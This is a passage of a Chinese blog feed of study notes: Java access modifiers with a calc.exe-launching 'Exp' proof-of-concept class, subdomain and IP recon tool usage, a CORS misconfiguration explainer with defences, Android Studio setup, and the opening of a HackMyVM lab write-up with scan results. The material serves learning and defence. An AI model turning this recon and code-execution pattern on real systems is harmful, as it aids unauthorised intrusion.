title="java访问策略"></a>java访问策略</h4><h3 id="1-private"><a href="#1-private" class="headerlink" title="1. private"></a>1. <code>private</code></h3><ul><li><p><strong>定义</strong>：<code>private</code> 修饰符用于限制对变量或方法的访问，仅限于声明它们的类内部。</p></li><li><p><strong>访问</strong>：只能在声明它的类内部访问，外部类或包无法访问。</p></li><li><p><strong>例子</strong>：</p><p>  javaCopy Code</p><p>  <code>private int privateVar; // 只能在 MyClass 内部访问 private void privateMethod() &#123;     // 只能在 MyClass 内部调用 &#125;</code></p></li></ul><h3 id="2-默认（包内可见）"><a href="#2-默认（包内可见）" class="headerlink" title="2. 默认（包内可见）"></a>2. 默认（包内可见）</h3><ul><li><p><strong>定义</strong>：当没有显式指定访问修饰符时，变量或方法具有默认访问权限。</p></li><li><p><strong>访问</strong>：只能在同一个包内的类中访问，包外的类无法访问。</p></li><li><p><strong>例子</strong>：</p><p>  javaCopy Code</p><p>  <code>int defaultVar; // 只能在 org.example 包内访问 void defaultMethod() &#123;     // 只能在 org.example 包内调用 &#125;</code></p></li></ul><h3 id="3-protected"><a href="#3-protected" class="headerlink" title="3. protected"></a>3. <code>protected</code></h3><ul><li><p><strong>定义</strong>：<code>protected</code> 修饰符允许对变量或方法的访问有更多的灵活性。</p></li><li><p><strong>访问</strong>：</p><ul><li>可以在同一个包内的类中访问。</li><li>可以在任何继承了该类的子类中访问，即使这些子类在不同的包中。</li></ul></li><li><p><strong>例子</strong>：</p><p>  javaCopy Code</p><p>  <code>protected int protectedVar; // 可以在 org.example 包内及其子类中访问 protected void protectedMethod() &#123;     // 可以在 org.example 包内及其子类中调用 &#125;</code></p></li></ul><h3 id="4-public"><a href="#4-public" class="headerlink" title="4. public"></a>4. <code>public</code></h3><ul><li><p><strong>定义</strong>：<code>public</code> 修饰符是最开放的访问级别。</p></li><li><p><strong>访问</strong>：可以在任何地方访问，不受包或类的限制。</p></li><li><p><strong>例子</strong>：</p><p>  javaCopy Code</p><p>  <code>public int publicVar; // 可以被任何地方访问 public void publicMethod() &#123;     // 可以被任何地方调用 &#125;</code></p></li></ul><h4 id="公有类"><a href="#公有类" class="headerlink" title="公有类"></a>公有类</h4><ul><li>一个.java文件中可以包含多个类，但只能有一个类声明为<code>public</code>。</li><li>这个<code>public</code>类的类名必须与文件名相同，并且这个类可以包含一个主方法 <code>main</code>。</li><li><code>main</code>方法的签名必须是 <code>public static void main(String[] args)</code>，这是Java程序的入口点。</li><li>如果一个项目中有多个<code>public</code>类，并且每个<code>public</code>类都包含了<code>main</code>方法，那么你可以选择在运行时指定哪个类作为程序的入口。</li></ul><h4 id="import-语句"><a href="#import-语句" class="headerlink" title="import 语句"></a>import 语句</h4><ul><li>一个Java源文件（.java文件）可以包含多个类，但只能有一个类声明为<code>public</code>。</li><li>这个<code>public</code>类的类名必须与文件名相同。</li><li>当你使用<code>import</code>语句时，只能导入这个Java文件中声明的<code>public</code>类。<br><code>import</code>语句的作用是为了方便引用其他包中的类，无论这些类是<code>public</code>还是非<code>public</code>。</li></ul><h3 id="包概念"><a href="#包概念" class="headerlink" title="包概念"></a>包概念</h3><ol><li><p><strong>每个Java文件只能有一个<code>package</code>语句</strong>：这是Java语法规定的，每个Java文件只能声明一次<code>package</code>，并且必须在文件的开头非注释部分出现。</p></li><li><p><strong>一个包可以有多个Java文件</strong>：一个包（如<code>org.example</code>）可以包含多个Java文件，每个文件中可以有一个或多个类，但只能有一个<code>public</code>类，并且这个类的类名必须与文件名相同。</p></li><li><p><strong>导入语句的使用</strong>：导入语句（<code>import</code>）可以在Java文件的任何位置使用，但通常会放在<code>package</code>语句之后，类定义之前。导入语句用于引入其他包中的类，让你可以在当前文件中使用这些类而不需要完整的类路径。</p></li></ol><p>所以针对于java来讲，我们的类是一种一个java文件里面一个public类。但是可以在一个包中拥有多个java文件。可以在protected 和public 和默认三种控制权限下访问。</p><ul><li><strong>在同一个包内</strong>，可以直接使用其他类，无需 <code>import</code>。 非public也可以</li><li><strong>在不同包</strong>，必须使用 <code>import</code> 语句引入需要的类。</li><li><strong>导入静态成员</strong> 也需要 <code>import</code> 语句。</li></ul><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>构造函数跟类有相同的命名，在new一个对象时候运行执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Exp</span> <span class="variable">exploit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ip2domain</title>
      <link href="/2024/09/17/ip2domain/"/>
      <url>/2024/09/17/ip2domain/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/sma11new/ip2domain?tab=readme-ov-file">https://github.com/sma11new/ip2domain?tab=readme-ov-file</a></p><h5 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h5><p>将要查询的ip&#x2F;domain放在txt文件内一行一个，<code>python ip2domain.py -f [file]</code> 指定，并加入其他参数即可。<br>**1、**百度权重阈值为1，请求时延为2，不开启ICP备案查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\ip2domain.py -f E:\Desktop\target.txt -s <span class="number">2</span> -r <span class="number">1</span></span><br></pre></td></tr></table></figure><p>**2、**百度权重阈值为1，请求时延为2，开启ICP备案查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\ip2domain.py -f E:\Desktop\target.txt -s <span class="number">2</span> -r <span class="number">1</span> --icp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oneforall</title>
      <link href="/2024/09/17/Oneforall/"/>
      <url>/2024/09/17/Oneforall/</url>
      
        <content type="html"><![CDATA[<p>作为一个子域名收集非常好用的工具，oneforall确实是比较好用。</p><h5 id="开源地址"><a href="#开源地址" class="headerlink" title="开源地址:"></a>开源地址:</h5><p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p>**安装不做赘述,我利用pip3做一个依赖安装。注意有一个issue有问题 导入re库。<br><a href="https://github.com/shmilylty/OneForAll/issues/392">https://github.com/shmilylty/OneForAll/issues/392</a><br>可以解决</p><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target example.com run</span><br><span class="line">python3 oneforall.py --targets ./example.txt run</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CORS_跨域资源共享</title>
      <link href="/2024/09/16/CORS-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/"/>
      <url>/2024/09/16/CORS-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<p><em><strong>参考文章:</strong></em></p><p><a href="https://xz.aliyun.com/t/12001?time__1311=GqGxRGiti=d052x+xCwx7qGIxpbDulE=oD">https://xz.aliyun.com/t/12001?time__1311=GqGxRGiti%3Dd052x%2BxCwx7qGIxpbDulE%3DoD</a><br><a href="https://blog.csdn.net/weixin_46622976/article/details/128452494">https://blog.csdn.net/weixin_46622976/article/details/128452494</a></p><h4 id="1-跨域资源共享"><a href="#1-跨域资源共享" class="headerlink" title="1. 跨域资源共享"></a>1. 跨域资源共享</h4><p>CORS是为了在<strong>保证安全的前提下</strong>，允许网页从不同域名的服务器请求资源，它实际上是对同源策略的<strong>补充和扩展</strong>。</p><p><strong>CORS</strong>（Cross-Origin Resource Sharing）是一个浏览器的机制，允许服务器在响应中指示哪些源是允许访问其资源的。通过在HTTP响应头中添加特定的CORS头信息（如<code>Access-Control-Allow-Origin</code>），服务器能够明确指定哪些外部源可以访问其资源，从而<strong>放宽</strong>同源策略的限制。</p><p>一般情况:</p><ul><li>比如前后端分离的情况，前后端域名不同，但是前端会需要用到后端的接口，发送ajax请求</li><li>电商网站加载第三方快递网站的物流信息</li></ul><p><strong>CORS的安全性</strong>：CORS实际上通过以下几种方式增强了安全性：</p><ul><li>只有经过授权的域才能访问资源。</li><li>可以指定哪些HTTP方法（如GET、POST、PUT等）可以跨域访问。</li><li>服务器可以控制是否允许带有认证信息（如cookies）的请求。</li></ul><ol><li><p><strong>简单请求</strong>：</p><ul><li>当浏览器发出一个跨域请求时，它会首先发送一个<strong>预检请求</strong>（<code>OPTIONS</code>请求），询问服务器是否允许该跨域操作。</li><li>如果服务器允许，响应中会带有<code>Access-Control-Allow-Origin</code>等CORS相关的头，指示浏览器允许该请求继续执行。</li></ul></li><li><p><strong>预检请求</strong>：</p><ul><li>对于某些复杂的跨域请求（如使用了<code>PUT</code>、<code>DELETE</code>方法或自定义头部），浏览器会先发送一个<code>OPTIONS</code>请求，这个请求并不会携带实际数据，仅用于检查服务器是否支持跨域请求。</li><li>如果服务器响应允许跨域，浏览器才会继续发送实际的请求。</li></ul></li><li><p><strong>允许特定的源</strong>：</p><ul><li>CORS允许服务器指定允许哪些源（域名、协议、端口）进行跨域请求，而不是让所有源都可以访问资源。这个权限通过设置<code>Access-Control-Allow-Origin</code>头来控制。</li></ul></li></ol><h4 id="2-请求头判别"><a href="#2-请求头判别" class="headerlink" title="2. 请求头判别"></a>2. 请求头判别</h4><h6 id="2-1-预检请求"><a href="#2-1-预检请求" class="headerlink" title="2.1 预检请求"></a>2.1 预检请求</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS /resource HTTP/1.1</span><br><span class="line">Origin: https://example.com</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">响应</span></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://example.com</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916210256.png" alt="image.png"></p><table><thead><tr><th>Access-Control-Allow-Origin</th><th>Access-Control-Allow-Credentials</th><th>结果</th></tr></thead><tbody><tr><td>attack 站点</td><td>true</td><td>存在漏洞</td></tr><tr><td>*</td><td>true</td><td>不存在漏洞</td></tr><tr><td>null</td><td>true</td><td>存在漏洞</td></tr><tr><td><safe_host> Null</td><td>true</td><td>不存在漏洞</td></tr></tbody></table><ul><li>其中Access-Control-Allow-Origin表示允许跨域访问的host</li><li>如果想跨域传输cookies,需要Access-Control-Allow-Credentials设置为true，并且需要与XMLHttpRequest.withCredentials 或Fetch API中的Request() 构造器中的credentials 选项结合使用，例如使用<code>XMLHttpRequest</code>的时候需要将<code>withCredentials</code>的值设置为true</li></ul><p>一般都是输入一个origin 查看返回包这两个响应头的情况去判定有无这个漏洞。</p><h5 id="2-2-身份验证"><a href="#2-2-身份验证" class="headerlink" title="2.2  身份验证"></a>2.2  身份验证</h5><p>CORS（跨源资源共享）允许浏览器进行跨域请求，但对于涉及cookie、HTTP认证等敏感数据的请求，浏览器会有额外的限制。默认情况下，跨域请求不会携带cookie，除非在请求中显式地配置。</p><h5 id="csrf和cors"><a href="#csrf和cors" class="headerlink" title="csrf和cors"></a>csrf和cors</h5><p>同源策略挡不住csrf，因为csrf是需要带上cookie的。但是csrf的一些防护策略，对于cors是适用的，因为对于csrf来讲，cookie的授权凭据才是最重要的，而并非是同源策略。因此针对于origin进行过滤，samesite，csrf token ，双重身份验证都是对于防护cors非常有用的。这一点可以参考我的 csrf 防护[[渗透测试&#x2F;top10以及常见漏洞&#x2F;csrf#​防御策略]]</p><h5 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h5><ul><li>Access-Control-Allow-Origin不应该设置为null，也不建议设置为*，做好设置成受信的站点</li><li>Access-Control-Allow-Methods的值可以控制尽量少一些，只留需要用到的请求方法</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-1.2.12-Android-Studio配置</title>
      <link href="/2024/09/16/2024-1-2-12-Android-Studio%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/09/16/2024-1-2-12-Android-Studio%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>最近在做一些app方向的移动技术开发学习，但是由于AS的配置问题，市面上找不到最新的2024版本的AS的相关配置。笔者也是踩了很多坑，因此想写一篇文章记录一下最新的AS 2024 1.2.12的对应java环境的一个配置。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://developer.android.com/studio?hl=zh-cn">https://developer.android.com/studio?hl=zh-cn</a><br>直接下载安装程序</p><h3 id="下载步骤"><a href="#下载步骤" class="headerlink" title="下载步骤"></a>下载步骤</h3><p>不多做赘述，直接next<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916163952.png" alt="image.png"></p><p>记得保存在d盘，直接安装就好。</p><p>JAVA的SDK 默认已经安装好。SDK环境默认已经安装完毕。</p><h5 id="Android-SDK"><a href="#Android-SDK" class="headerlink" title="Android  SDK"></a>Android  SDK</h5><p>初次进入会提示，如何安装，最好选择custom 安装。不然东西全在c盘，太占空间。<br>进入之后勾选android sdk只安装这一个就够了。然后等待安装。</p><h5 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h5><p>开始进入项目<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916164840.png" alt="image.png"></p><p>可以看到有很多的项目准备，我们使用phone ，然后进入No activity 进入构建项目。因为不明白为什么最新版的跟以前的不同，如果我们选择Empty activity的话，我们无法选择Java语言，默认是kotlin。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916165052.png" alt="image.png"><br>我选择android 9(因为老师说比较适合我&lt;–..–&gt;)   使用gradle构建项目，名字自己写。进入之后一般都会有一个很头疼的事情。gradle的下载。</p><h5 id="gradle"><a href="#gradle" class="headerlink" title="gradle"></a>gradle</h5><p>我建议是手动下载，一般来讲他都会报错说无法下载，然后你使用他下载的连接，下载一个gradle压缩包。需要的版本就是刚好对应的。重点来了，由于我们希望所有东西都能够保存在d盘。<br>**调整gradle默认保存位置<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916165419.png" alt="image.png"></p><p>然后重新启动android studio 可以看到原本gradle里面多了很多文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\Download\.gradle\wrapper\dists\gradle<span class="literal">-8</span>.<span class="number">7</span><span class="literal">-bin</span>\bhs2wmbdwecv87pi65oeuq5iu</span><br></pre></td></tr></table></figure><p>在这个文件夹下面把我们下载好的gradle 复制到目录底下。同时解压缩zip文件。注意其实这个文件夹下面本来是有两个文件的。把lck后缀的文件保留，另外一个文件删除。同时再复制一份lck文件把后缀名从lck保存为ok。做完这些事情之后，我们可以重新启动AS等到AS对gradle的加载。可能到现在还有点懵，稍微介绍一下Gradle。</p><h6 id="Gradle"><a href="#Gradle" class="headerlink" title="Gradle"></a>Gradle</h6><p>Android Gradle 是一个自动化构建工具，用于管理 Android 项目的构建过程。它基于 Gradle 构建系统，允许开发者定义和管理构建任务，例如编译代码、打包 APK、运行测试等。通过 <code>build.gradle</code> 文件，开发者可以配置项目的构建选项、依赖关系和插件。Gradle 的灵活性使得 Android 项目可以轻松适应不同的构建需求和配置。 针对第三方库进行管理。对应相关版本。</p><h5 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h5><p>注意他的加载时间真的慢，加载完毕之后创建一个虚拟机，最新版的device找了半天<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916170208.png" alt="image.png"></p><p>进入之后加号 +  创建一个虚拟机。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916170318.png" alt="image.png"><br>选择你要的型号然后next，选择一个系统image镜像。之后finish就好了。<br>到目前为止，我们的所有配置几乎已经做好了。可以运行一个项目看看，但是此时我们由于选择的是Empty activity 所以我们无法直接运行，我们需要自己的我们的ui文件和java代码文件以及我们的activity</p><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p>这个里给出一个hello world 的测试项目</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916170658.png" alt="image.png"><br>分别把这三个文件放到对应的位置。</p><p>***AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.myapplication&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.MyApplication&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>设置一个主活动。</p><p>***MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;MainActivity&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">btnHelloWorld</span> <span class="operator">=</span> findViewById(R.id.btnHelloWorld);</span><br><span class="line">        btnHelloWorld.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// 打印日志到 Logcat</span></span><br><span class="line">                Log.d(TAG, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>***activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span>        <span class="attr">android:id</span>=<span class="string">&quot;@+id/btnHelloWorld&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Click me&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerInParent</span>=<span class="string">&quot;true&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是ui文件。注意layout文件夹需要自己创建，新版本默认不自带。注意开启虚拟机。<br>点击run 进行项目构建运行。不出意外你会看到clickme<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240916171348.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Android移动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android移动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm-leet</title>
      <link href="/2024/09/15/Hackmyvm-leet/"/>
      <url>/2024/09/15/Hackmyvm-leet/</url>
      
        <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">7777/tcp open  cbt</span><br><span class="line"></span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 e15d7cb7079217dc46767dbea95043d2 (ECDSA)</span><br><span class="line">|_  256 a0f3b38693f5588288dde510db35de62 (ED25519)</span><br><span class="line">7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)</span><br><span class="line">|_http-server-header: Werkzeug/3.0.1 Python/3.11.2</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">MAC Address: 08:00:27:2B:F0:9A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h5 id="资产"><a href="#资产" class="headerlink" title="资产"></a>资产</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/download             (Status: 500) [Size: 14478]</span><br><span class="line">/console              (Status: 200) [Size: 1563]</span><br></pre></td></tr></table></figure><p> Linux 4.15 - 5.6<br> OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)<br> Werkzeug&#x2F;3.0.1<br> Python&#x2F;3.11.2<br> Flask 3.0.1</p><h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><h5 id="leet编码"><a href="#leet编码" class="headerlink" title="leet编码"></a>leet编码</h5><p>你提到的 “L33T converter” 通常指的是一个将文本转换为所谓的 “leet speak” 或 “1337 speak” 的工具。这种语言转换是一种将字母替换为看起来类似的数字或符号的俚语形式，常见于网络文化，特别是早期的黑客和极客社区。</p><p>在你给出的例子中：</p><ul><li>输入：<code>whoami</code></li><li>输出：<code>wh04m1</code></li></ul><p>这里的转换规则大致如下：</p><ul><li><code>o</code> 被替换为 